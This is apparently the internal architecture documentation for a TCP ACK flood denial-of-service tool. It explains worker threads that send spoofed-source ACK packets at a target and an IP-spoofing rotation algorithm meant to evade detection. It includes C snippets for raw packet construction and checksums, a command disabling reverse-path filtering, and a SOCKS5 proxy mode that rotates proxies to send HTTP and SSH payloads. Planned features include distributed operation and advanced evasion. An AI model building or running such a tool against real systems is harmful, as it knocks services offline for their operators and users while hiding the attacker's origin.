# Architecture and Working Logic

## Overview

This document provides a detailed explanation of how the TCP ACK flood tool works internally, including algorithms, data structures, and execution flow.

## System Architecture

### High-Level Design

```
┌─────────────────────────────────────────────────────────────┐
│                        Main Process                         │
│                                                             │
│  ┌──────────────┐     ┌──────────────┐    ┌──────────────┐  │
│  │  Argument    │     │  Rate        │    │  Statistics  │  │
│  │  Parser      │───▶│  Limiter     │    │  Thread      │  │
│  │              │     │  (Token      │    │  (Monitoring)│  │
│  └──────┬───────┘     │   Bucket)    │    └──────┬───────┘  │
│         │             └──────┬───────┘            │         │
│         │                    │                    │         │
│         ▼                    ▼                    ▼         │
│  ┌──────────────────────────────────────────────────────┐   │
│  │              Thread Pool Manager                     │   │
│  │  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐      │   │
│  │  │Thread1 │  │Thread2 │  │Thread3 │  │ThreadN │      │   │
│  │  └───┬────┘  └───┬────┘  └───┬────┘  └───┬────┘      │   │
│  └──────┼───────────┼───────────┼───────────┼───────────┘   │
│         │           │           │           │               │
└─────────┼───────────┼───────────┼───────────┼───────────────┘
          │           │           │           │
          ▼           ▼           ▼           ▼
    ┌─────────────────────────────────────────────┐
    │         Raw Socket Layer                    │
    │  (PF_INET, SOCK_RAW, IPPROTO_TCP)           │
    └──────────────────┬──────────────────────────┘
                       │
                       ▼
              ┌─────────────────┐
              │  Network Stack  │
              │  (Kernel)       │
              └─────────────────┘
```

## Core Components

### 1. Main Process (`main()`)

**Responsibilities:**
- Parse command-line arguments
- Initialize system settings (rp_filter, file limits)
- Load SOCKS5 proxies (if enabled)
- Create worker thread pool
- Start statistics monitoring thread
- Manage attack lifecycle (start/stop)

**Key Operations:**
```c
// Disable reverse path filtering for IP spoofing
system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter");

// Increase file descriptor limits
setrlimit(RLIMIT_NOFILE, &rl);

// Initialize rate limiter
init_rate_limiter(max_pps);

// Create worker threads
pthread_create(&thread[i], &attr, flooding_thread, target_ip);
```

### 2. Rate Limiter (Token Bucket Algorithm)

**Purpose:** Control packet generation rate to prevent system overload

**Data Structure:**
```c
typedef struct {
    uint64_t tokens;           // Current available tokens
    uint64_t max_tokens;       // Maximum bucket capacity
    uint64_t refill_rate;      // Tokens added per second
    struct timespec last_refill; // Last refill timestamp
    pthread_mutex_t mutex;     // Thread-safe access
} token_bucket_t;
```

**Algorithm:**
1. Each packet requires 1 token
2. Tokens refill at `refill_rate` per second
3. If tokens available: consume and send packet
4. If no tokens: thread sleeps briefly

**Flow:**
```
Time T0: tokens = max_tokens (e.g., 100000)
Time T1: Send packet → tokens = 99999
Time T2: Send packet → tokens = 99998
...
Time T+1s: Refill → tokens = min(max_tokens, tokens + refill_rate)
```

### 3. Worker Thread (`flooding_thread()`)

**Responsibilities:**
- Create and manage raw sockets
- Generate spoofed IP addresses
- Craft TCP ACK packets
- Maintain connection state
- Send packets to target

**Execution Flow:**

```
1. Initialize
   ├─ Create raw sockets (up to 10,000)
   ├─ Allocate connection state hash table
   └─ Setup cleanup handlers

2. Main Loop (infinite until g_running = 0)
   ├─ Generate spoofed source IP
   ├─ Calculate source port
   ├─ Get/create connection state
   ├─ Build TCP packet:
   │  ├─ IP header
   │  ├─ TCP header (60 bytes)
   │  ├─ TCP options (40 bytes)
   │  └─ Payload (1420 bytes)
   ├─ Calculate checksums
   ├─ Check rate limiter
   └─ Send packet via sendto()

3. Cleanup
   └─ Close sockets, free memory
```

### 4. IP Spoofing Algorithm

**Function:** `generate_spoofed_ip(thread_id, iteration)`

**Algorithm:**
```c
uint32_t rotation_key = (thread_id * 7919) + 
                        (iteration * 997) + 
                        (time_seed * 8191) + 
                        (iteration * 3571) + 
                        (thread_id * 5779) + 
                        (iteration * 7919);

int ip_class = rotation_key % 120;
uint32_t ip_offset = rotation_key % 16777216;
```

**IP Class Distribution:**
- Classes 0-2: 10.x.x.x (private)
- Classes 3-5: 172.16-31.x.x (private)
- Classes 6-8: 192.168.x.x (private)
- Classes 9-115: Various public IP ranges
- Classes 116-119: Random public IPs

**Purpose:** Distribute spoofed IPs across diverse ranges to avoid detection patterns

### 5. Connection State Tracking

**Data Structure:**
```c
typedef struct {
    uint32_t source_ip;      // Spoofed source IP
    uint16_t source_port;    // Source port
    uint32_t seq_base;       // Base sequence number
    uint32_t ack_base;       // Base acknowledgment number
    uint32_t seq_current;    // Current sequence
    uint32_t ack_current;    // Current acknowledgment
    uint64_t packet_count;   // Packets sent for this connection
    uint16_t window_size;   // TCP window size
    uint8_t ttl;            // IP TTL value
} conn_state_t;
```

**Hash Table:**
- Size: 65536 buckets
- Hash function: `(source_ip ^ source_port) & 0xFFFF`
- Collision resolution: Linear probing

**State Evolution:**
```
Packet 1:
  seq_current = seq_base + 1460
  ack_current = ack_base + 1460
  window_size = random(16384, 65535)
  ttl = random(64, 128, 255)

Packet N:
  seq_current += random(0, 1460)
  ack_current += random(1460, 14600)
  window_size += random(-1000, 1000)  // Bounded
```

### 6. TCP Packet Construction

#### IP Header (20 bytes)
```c
iph->version = 4;
iph->ihl = 5;                    // 20 bytes header
iph->tos = 0;                    // Type of service
iph->tot_len = 1500;             // Total packet length
iph->id = htons(random(1, 65535));
iph->frag_off = htons(0x4000);   // DF flag set
iph->ttl = 64/128/255;           // Time to live
iph->protocol = IPPROTO_TCP;     // TCP protocol
iph->saddr = spoofed_ip;         // Spoofed source
iph->daddr = target_ip;          // Target IP
iph->check = 0;                  // Calculated later
```

#### TCP Header (60 bytes)
```c
tcph->source = htons(random(32768, 65535));
tcph->dest = htons(target_port);
tcph->seq = htonl(seq_val);
tcph->ack_seq = htonl(ack_val);
tcph->doff = 15;                 // 60 bytes (15 * 4)
tcph->ack = 1;                   // ACK flag
tcph->syn = 0;                   // No SYN
tcph->fin = 0;                   // No FIN
tcph->rst = 0;                   // No RST
tcph->psh = 0;                   // No PSH
tcph->urg = 0;                   // No URG
tcph->window = htons(window_size);
tcph->check = 0;                 // Calculated later
```

#### TCP Options (40 bytes)

**Structure:**
```
Offset  Type    Length  Description
0       MSS     4       Maximum Segment Size (1300-1460)
4       WS      3       Window Scaling (7-14)
7       TS      10      Timestamp
17      SACK-P  2       SACK Permitted
19      SACK    10      SACK Block 1 (SLE, SRE)
29      SACK    10      SACK Block 2 (optional)
39      NOP     1       Padding
```

**SACK Block Format:**
```
[SACK Type: 5][Length: 10][SLE: 4 bytes][SRE: 4 bytes]
SLE = Start Left Edge (ack_val + random(1460, 14600))
SRE = Start Right Edge (SLE + random(1460, 7300))
```

#### Payload (1420 bytes)
```
All bytes set to 0xFF:
[0xFF][0xFF][0xFF]...[0xFF] (1420 times)
```

### 7. Checksum Calculation

#### IP Header Checksum
```c
// Zero the checksum field
iph->check = 0;

// Calculate 16-bit one's complement sum
iph->check = checksum_tcp_packet((unsigned short *) datagram, IP_HDR_LEN);

// If result is 0, set to 0xFFFF
if (iph->check == 0) {
    iph->check = 0xFFFF;
}
```

#### TCP Checksum (with Pseudo-Header)
```c
// Create pseudo-header
psh.source_address = spoofed_ip;
psh.dest_address = target_ip;
psh.placeholder = 0;
psh.protocol = IPPROTO_TCP;
psh.tcp_length = TCP_TOTAL_LEN_WITH_PAYLOAD;

// Build pseudo-packet: [pseudo-header][TCP header][TCP options][payload]
// Calculate checksum over entire pseudo-packet
tcph->check = checksum_tcp_packet((unsigned short*) pseudogram_buffer, total_len);
```

### 8. SOCKS5 Proxy Mode

**When `--socks5` flag is used:**

1. **Proxy Loading:**
   - Reads `socks5.txt` file
   - Format: `ip:port` or `ip:port:username:password`
   - Stores in global proxy array
   - Supports up to 10,000 proxies

2. **Proxy Selection:**
   - Round-robin rotation
   - Skips proxies with >30 failures
   - Auto-resets after 100 failures

3. **Connection Flow:**
   ```
   Client → SOCKS5 Proxy → Target Server
   
   Steps:
   1. Connect to proxy
   2. Send handshake (0x05 0x01 0x02)
   3. Receive method selection
   4. Send authentication (if required)
   5. Send CONNECT request
   6. Receive connection response
   7. Send HTTP/SSH payloads
   ```

4. **Payload Generation:**
   - HTTP (port != 22): HTTP GET requests with User-Agent rotation
   - SSH (port 22): SSH protocol strings

## Performance Optimizations

### 1. Socket Pooling
- Pre-create up to 10,000 raw sockets per thread
- Reuse sockets instead of creating/destroying
- Rotate through socket pool on EAGAIN

### 2. Memory Management
- Thread-local storage for connection states
- Static buffers for packet construction
- Efficient hash table for O(1) lookups

### 3. CPU Optimization
- Compiler optimizations: `-O3 -march=native`
- Atomic operations for counters
- Minimal locking (only for rate limiter)

### 4. Network Optimization
- Large socket buffers (1GB)
- Non-blocking I/O
- Batch statistics updates (every 1000 packets)

## Thread Safety

### Atomic Operations
```c
// Increment counters
__sync_add_and_fetch(&g_total_packets_sent, 1);

// Compare and swap
__sync_lock_test_and_set(&proxy->failures, 0);
```

### Mutex Locks
```c
// Rate limiter access
pthread_mutex_lock(&g_rate_limiter.mutex);
// ... modify tokens ...
pthread_mutex_unlock(&g_rate_limiter.mutex);
```

### Thread-Local Storage
```c
// Per-thread connection state
static __thread uint8_t tcp_options_template[40];
static __thread uint16_t conn_ip_ids[256];
```

## Error Handling

### Socket Errors
- `EAGAIN/EWOULDBLOCK`: Rotate to next socket
- `EPERM/EACCES`: Exit thread (no raw socket permission)
- Other errors: Log and continue

### Proxy Errors
- Connection failures: Mark proxy as failed
- Authentication failures: Skip proxy
- Timeout: Close connection and retry

### Signal Handling
- `SIGINT/SIGTERM`: Graceful shutdown
- Double CTRL+C: Immediate exit
- Cleanup handlers: Close sockets, free memory

## Statistics Collection

### Metrics Tracked
- Total packets sent
- Total packets failed
- Packets per second (PPS)
- Bandwidth (Mbps)
- Proxy connections/failures
- Error counts by type

### Update Frequency
- Real-time: Every 1 second
- Batch updates: Every 1000 packets
- Final report: On exit

## Limitations

1. **Root Required**: Raw sockets need root privileges
2. **Linux Only**: Uses Linux-specific features
3. **Network Dependent**: Performance varies by network infrastructure
4. **Detection Risk**: Signatures can be detected (see protection guides)
5. **Resource Intensive**: High thread counts consume CPU/memory

## Future Improvements

- IPv6 support
- UDP flood mode
- Custom payload patterns
- Distributed mode (multiple hosts)
- Web-based control interface
- Advanced evasion techniques

